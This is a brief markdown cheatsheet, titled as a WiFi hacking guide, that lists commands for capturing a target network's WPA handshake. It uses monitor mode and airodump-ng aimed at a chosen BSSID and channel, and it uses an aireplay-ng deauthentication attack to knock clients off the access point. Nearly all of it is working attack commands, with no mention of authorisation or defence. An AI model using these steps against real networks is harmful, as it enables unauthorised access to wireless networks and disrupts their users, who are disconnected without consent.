# WiFi Hacking Cheatsheet

<!--
##################################################################
##################################################################
-->

#### Capture WiFi traffic without connecting to WiFi

1. `ifconfig wlan1 down` **Step 1 and Step 2 are only needed if Step 3 doesnt work initially**
2. `iwconfig wireless_adapter_name mode monitor`
3. `ifconfig wireless_adapter_name up`
4. `airodump-ng wireless_adapter_name`
5. Determine BSSID | CH | ESSID of target.
6. `airodump-ng --bssid 'TargetMACaddressHere' --essid 'RouterNameHere' -c ChannelNumber -w SaveDestination wireless_adapter_name`
7. Make sure that WPA handshake is captured. This can be seen in top right corner of airodump-ng output. If no handshake is capture you can attempt to deauth the AP using `aireplay-ng --deauth NumberOfAttempts -a MACaddress wireless_adapter_name`
